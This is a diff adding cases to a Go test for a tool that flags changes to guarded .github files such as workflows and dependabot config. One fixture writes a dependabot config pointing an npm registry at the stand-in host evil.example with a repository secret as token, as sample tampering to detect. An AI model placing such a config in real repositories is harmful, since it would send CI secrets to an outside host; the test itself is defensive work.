@@ -117,6 +117,16 @@ func TestWorkflowChanges(t *testing.T) {
 	check("existing commit with a workflow edit", z, evil, "skip", base, true)
 	check("existing clean commit", z, code, "skip", base, false)
 
+	r.git("", "checkout", "-q", "-b", "deps", code)
+	r.write(".github/dependabot.yml", "version: 2\nregistries: {npm: {type: npm-registry, url: https://evil.example, token: ${{secrets.NPM}}}}\n")
+	deps := r.commit("add dependabot config")
+	check("dependabot config add", z, deps, code, base, true)
+	r.write(".github/dependabot.yaml", "version: 2\n")
+	r.git("", "rm", "-q", ".github/dependabot.yml")
+	depsYAML := r.commit("rename dependabot config")
+	check("dependabot config edit", deps, depsYAML, deps, base, true)
+	r.git("", "checkout", "-q", "main")
+
 	r.git("", "rm", "-q", "-r", ".github/workflows")
 	gone := r.commit("delete workflows")
 	check("workflow delete", evil, gone, evil, base, true)
@@ -150,6 +160,16 @@ func TestWorkflowChanges(t *testing.T) {
 	r.write(".github/workflows/new.yml", "on: push\n")
 	fresh := r.commit("root with workflow")
 	check("root commit with workflow", z, fresh, "", base, true)
+
+	// A .github with none of the guarded entries is no change from none.
+	r.git("", "checkout", "-q", "--orphan", "plain")
+	r.git("", "rm", "-q", "-r", "--cached", ".")
+	r.git("", "clean", "-q", "-fdx")
+	r.write("README", "hi\n")
+	bare := r.commit("no .github")
+	r.write(".github/CODEOWNERS", "* @me\n")
+	owners := r.commit("add CODEOWNERS")
+	check("first .github file, not guarded", bare, owners, bare, bare, false)
 }
 
 func TestParseCommitReadsLikeGit(t *testing.T) {
